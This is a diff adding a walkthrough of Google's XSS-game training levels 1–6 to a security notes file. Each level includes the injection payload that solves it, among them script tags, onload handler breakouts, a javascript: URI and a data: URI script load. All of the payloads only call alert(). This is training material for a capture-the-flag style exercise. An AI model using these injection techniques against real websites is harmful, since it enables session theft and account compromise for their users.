@@ -576,3 +576,175 @@ https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy\#
 Ref: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
 
 Share this:
+
+
+
+##
+#
+https://gist.github.com/adriaandens/722383ba4c717baf8007
+#
+##
+
+# XSS-game by Google
+
+Welcome, recruit!
+Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications. These nasty buggers can allow your enemies to steal or modify user data in your apps and you must learn to dispatch them, pronto!
+
+At Google, we know very well how important these bugs are. In fact, Google is so serious about finding and fixing XSS issues that we are paying mercenaries up to $7,500 for dangerous XSS bugs discovered in our most sensitive products.
+
+In this training program, you will learn to find and exploit XSS bugs. You'll use this knowledge to confuse and infuriate your adversaries by preventing such bugs from happening in your applications.
+
+There will be cake at the end of the test.
+
+## Level 1: Hello, world of XSS
+
+This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping.
+
+![](http://adr.iaan.be/xss/1.png)
+
+### Solution
+
+```html
+<script> alert('XSS') </script>
+```
+
+![](http://adr.iaan.be/xss/2.png)
+
+## Level 2: Persistence is key
+
+Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully. This level shows how easily XSS bugs can be introduced in complex apps.
+
+![](http://adr.iaan.be/xss/3.png)
+
+### Solution
+
+```html
+<img src="https://xss-game.appspot.com/static/level2_icon.png" onload="alert('XSS')" />
+```
+
+![](http://adr.iaan.be/xss/4.png)
+![](http://adr.iaan.be/xss/5.png)
+
+## Level 3: That sinking Feeling
+
+As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood. The application on this level is using one such hidden sink.
+
+![](http://adr.iaan.be/xss/6.png)
+
+### Solution
+
+We can see in the source code that the parameter is not filtered and directely put into the image tags. This allows us to inject code...
+
+```javascript
+function chooseTab(num) {
+	// Dynamically load the appropriate image.
+	var html = "Image " + parseInt(num) + "<br>";
+	html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+	$('#tabContent').html(html);
+	// ...
+}
+```
+![](http://adr.iaan.be/xss/7.png)
+![](http://adr.iaan.be/xss/8.png)
+
+We can inject the following: 
+```
+1.jpg'onload='alert("xss")'
+```
+which gives the following html:
+
+```HTML
+<img src='/static/level3/cloud1.jpg'onload='alert("xss")'.jpg' />
+```
+
+![](http://adr.iaan.be/xss/9.png)
+![](http://adr.iaan.be/xss/10.png)
+
+## Level 4: Context matters
+
+Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why. 
+
+![](http://adr.iaan.be/xss/11.png)
+
+### Solution
+
+Similar to level 3, we see:
+
+```html
+<img onload="startTimer('100');" src="/static/loading.gif"></img>
+```
+![](http://adr.iaan.be/xss/12.png)
+
+So we only have to mess with the GET statement to inject our code.
+```
+https://xss-game.appspot.com/level4/frame?timer=100')%3Balert('XSS
+```
+(%3B is the url encoded version of a semi-colon).
+
+Which renders: 
+```html
+onload="startTimer('100');alert('XSS');" src="/static/loading.gif"></img>
+```
+![](http://adr.iaan.be/xss/13.png)
+
+## Level 5: Breaking protocol
+
+Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM. 
+
+![](http://adr.iaan.be/xss/14.png)
+
+### Solution
+
+We see that the link on the second page changes when we change the "next" parameter in the URL. 
+
+![](http://adr.iaan.be/xss/15.png)
+![](http://adr.iaan.be/xss/16.png)
+
+So we simply change the URL to: 
+```
+https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")
+```
+
+## Level 6: Follow the rabbit
+
+Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash. This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.
+
+![](http://adr.iaan.be/xss/17.png)
+
+### Solution
+
+```javascript
+function includeGadget(url) {
+	var scriptEl = document.createElement('script');
+
+	// This will totally prevent us from loading evil URLs!
+	if (url.match(/^https?:\/\//)) {
+		setInnerText(document.getElementById("log"),
+		"Sorry, cannot load a URL containing \"http\".");
+		return;
+	}
+
+	// Load this awesome gadget
+	scriptEl.src = url;
+
+	// Show log messages
+	scriptEl.onload = function() { 
+		setInnerText(document.getElementById("log"),  
+		"Loaded gadget from " + url);
+	}
+	scriptEl.onerror = function() { 
+		setInnerText(document.getElementById("log"),  
+		"Couldn't load gadget from " + url);
+	}
+
+	document.head.appendChild(scriptEl);
+}
+```
+
+We can inject this by using data:text/javascript
+For example: 
+```
+https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('XSS')
+```
+
+![](http://adr.iaan.be/xss/18.png)
